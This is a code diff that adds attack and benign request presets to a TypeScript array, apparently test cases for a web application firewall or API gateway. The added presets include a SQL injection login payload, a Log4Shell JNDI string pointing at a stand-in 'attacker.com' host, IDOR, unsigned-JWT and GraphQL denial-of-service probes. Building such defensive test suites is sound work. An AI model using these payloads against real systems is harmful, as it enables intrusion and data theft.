@@ -138,15 +138,122 @@ const PRESET_ARSENAL: PresetPayload[] = [
     expected: 'blocked'
   },
   {
+    name: 'Bot: Credential Stuffing Sweeper',
+    category: 'bot_abuse',
+    tag: 'CWE-799 / Bot Attack',
+    method: 'POST',
+    path: '/api/v1/auth/login',
+    clientIp: '185.220.102.8',
+    query: '',
+    body: JSON.stringify({
+      username: 'admin',
+      password: "' OR '1'='1"
+    }, null, 2),
+    description: 'High-frequency automated bot executing credential stuffing with SQLi payloads.',
+    expected: 'blocked'
+  },
+  {
+    name: 'Bot: Headless Scraper Data Exfiltration',
+    category: 'bot_abuse',
+    tag: 'Scraper Sweeper',
+    method: 'GET',
+    path: '/api/v1/users/export',
+    clientIp: '194.26.29.112',
+    query: 'format=json&limit=5000',
+    body: '',
+    description: 'Automated Headless Chrome scraper attempting bulk customer record exfiltration.',
+    expected: 'blocked'
+  },
+  {
+    name: 'API Abuse: BOLA / IDOR Account Takeover',
+    category: 'api_abuse',
+    tag: 'OWASP API1:2023',
+    method: 'GET',
+    path: '/api/v1/accounts/10042/statement',
+    clientIp: '45.154.255.71',
+    query: '',
+    body: '',
+    description: 'Broken Object Level Authorization probe attempting to access another user account statement.',
+    expected: 'blocked'
+  },
+  {
+    name: 'API Abuse: JWT Algorithm Confusion (none-alg)',
+    category: 'api_abuse',
+    tag: 'OWASP API2:2023',
+    method: 'POST',
+    path: '/api/v1/admin/settings',
+    clientIp: '193.142.146.210',
+    query: '',
+    body: JSON.stringify({
+      adminMode: true,
+      bypass2FA: true
+    }, null, 2),
+    description: 'Unsigned JWT token with "alg":"none" header attempting admin privilege escalation.',
+    expected: 'blocked'
+  },
+  {
+    name: 'API Abuse: GraphQL Nested Query Complexity',
+    category: 'api_abuse',
+    tag: 'GraphQL DoS',
+    method: 'POST',
+    path: '/graphql',
+    clientIp: '185.190.140.11',
+    query: '',
+    body: JSON.stringify({
+      query: 'query { user { friends { friends { friends { id name email } } } } }'
+    }, null, 2),
+    description: 'Deeply nested recursive GraphQL query designed to exhaust backend CPU resources.',
+    expected: 'blocked'
+  },
+  {
+    name: 'RCE: JNDI Log4Shell Remote Code Execution',
+    category: 'cmdi',
+    tag: 'CVE-2021-44228',
+    method: 'GET',
+    path: '/api/products',
+    clientIp: '185.220.101.99',
+    query: 'search=${jndi:ldap://attacker.com/exploit}',
+    body: '',
+    description: 'JNDI injection header payload targeting Log4j remote class execution.',
+    expected: 'blocked'
+  },
+  {
+    name: 'Rate Limit: Volumetric Rate Limit Burst Violation',
+    category: 'rate_limit',
+    tag: 'Token Bucket 429',
+    method: 'GET',
+    path: '/api/v1/resource',
+    clientIp: '198.51.100.222',
+    query: 'burst=true&count=120',
+    body: '',
+    description: 'Volumetric request spike exceeding 100 req/min token bucket threshold.',
+    expected: 'blocked'
+  },
+  {
     name: 'Legitimate Safe Request: Catalog Search',
     category: 'benign',
     tag: 'Normal API Traffic',
     method: 'GET',
     path: '/api/products',
-    clientIp: '185.199.108.64', // Canada
+    clientIp: '185.199.108.64',
     query: 'category=hardware&limit=20',
     body: '',
     description: 'Standard legitimate API call from legitimate customer. Passes all security checks.',
+    expected: 'allowed'
+  },
+  {
+    name: 'Legitimate Safe Request: User Profile Update',
+    category: 'benign',
+    tag: 'Normal API Traffic',
+    method: 'PUT',
+    path: '/api/v1/user/profile',
+    clientIp: '198.51.100.45',
+    query: '',
+    body: JSON.stringify({
+      displayName: 'Alexander Hamilton',
+      bio: 'Building secure web applications'
+    }, null, 2),
+    description: 'Standard authenticated profile edit matching OpenAPI schema definition.',
     expected: 'allowed'
   }
 ];
